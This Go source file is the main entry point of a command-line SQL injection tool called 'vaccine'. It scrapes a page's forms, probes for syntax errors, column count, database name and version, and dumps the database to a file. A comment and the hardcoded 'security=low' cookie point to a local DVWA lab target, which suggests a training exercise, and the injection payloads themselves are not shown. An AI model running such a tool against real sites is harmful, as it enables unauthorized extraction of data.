package main

import (
	"fmt"
	"net/http"
	"log"
	"net/url"
	"os"
)

//http://127.0.0.1:8080/vulnerabilities/sqli/
// c6derp6ibht228uh4nj5pjogq7
type Input struct {
	filename string
	method string
	baseURL string
	session string
	sessionCookie  []*http.Cookie
}

func Start(input *Input) {
	client := HttpClient{input.baseURL, input.sessionCookie}
	scraper := Scraper{&client}
	forms := scraper.GetPageValues()
	injector := SqlInjector{&client, forms, input.baseURL, "", "--", "", "", ""}
	injector.GetSyntaxError() 
	injector.GetColumnNumber()
	injector.GetDatabaseName()
	injector.GetDatabaseVersion()

	if len(injector.comment) == 0 || len(injector.escape) == 0 || len(injector.db) == 0 || len(injector.dbVersion) == 0 {
		fmt.Println("Data could not be injected. Try again.")
		return
	}
	injector.GetDatabaseDump(input.filename)
}

func ParseInput(input *Input) {
	args := os.Args
	var flagIndex int
	usageMsg := "usage: ./vaccine [-oX] URL"
	if len(args) <= 1 {
		log.Fatal(usageMsg)
	}

	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "-o", "-X", "-s":
			flagIndex = i
			i++
			if i >= len(args) {
				log.Fatal(usageMsg)
			}
			switch args[flagIndex] {
			case "-o":
				input.filename = args[i]
				if _, err := os.Stat(input.filename); os.IsNotExist(err) {
					log.Fatal(err)
				}
			case "-X":
				input.method = args[i]
			case "-s":
				input.session= args[i]
			}

		default:
			u, err := url.Parse(args[i]); if err != nil {
				log.Fatal(usageMsg)
			}
			if u.Scheme == "" {
				log.Fatal("Unsupported protocol scheme for: ", args[i])
			}
	
			input.baseURL = args[i]
		}
	}
}

func main() {
	input := Input{"db_dump.txt", "GET", "", "", nil}
	ParseInput(&input) 
	if len(input.session) > 0 {
		sessionCookie := []*http.Cookie{
			{Name: "PHPSESSID", Value: input.session},
			{Name: "security", Value: "low"},
		}
		input.sessionCookie = sessionCookie
	}
	Start(&input)
}
